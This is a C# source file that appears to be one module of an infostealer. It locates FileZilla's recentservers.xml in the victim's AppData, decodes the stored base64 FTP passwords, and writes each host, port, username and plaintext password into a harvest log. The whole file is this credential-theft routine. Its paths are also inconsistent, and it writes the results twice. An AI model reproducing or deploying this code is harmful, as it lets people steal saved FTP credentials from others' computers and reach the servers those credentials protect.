using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace SHARP
{
    internal class FileZilla
    {
      private static StringBuilder SB = new StringBuilder();
      public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");

      public static async Task GetFileZilla(string head)
      {
        string str = head;
        if (!File.Exists(FileZilla.FzPath))
          return;
        Directory.CreateDirectory(str + "\\FTP\\FileZilla");
        FileZilla.GetDataFileZilla(FileZilla.FzPath, str + "\\FTP\\FileZilla\\FTP\\FileZilla.log");
      }

      public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
      {
        try
        {
          if (!File.Exists(PathFZ))
            return;
          if (File.Exists(PathFZ))
          {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.Load(PathFZ);
            foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
            {
              string innerText1 = xmlElement.GetElementsByTagName("Host")[0].InnerText;
              string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
              string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
              string str = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
              if (!string.IsNullOrEmpty(innerText1))
              {
                if (!string.IsNullOrEmpty(innerText2))
                {
                  if (!string.IsNullOrEmpty(innerText3))
                  {
                    if (!string.IsNullOrEmpty(str))
                    {
                      FileZilla.SB.AppendLine("Host: " + innerText1);
                      FileZilla.SB.AppendLine("Port: " + innerText2);
                      FileZilla.SB.AppendLine("User: " + innerText3);
                      FileZilla.SB.AppendLine($"Pass: {str}\r\n");
                      ++Counting.FileZilla;
                    }
                    else
                      break;
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                break;
            }
            if (FileZilla.SB.Length > 0)
              File.AppendAllText(SaveFile, FileZilla.SB.ToString());
          }
          if (FileZilla.SB.Length <= 0)
            return;
          File.AppendAllText(SaveFile, FileZilla.SB.ToString());
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
    }
}
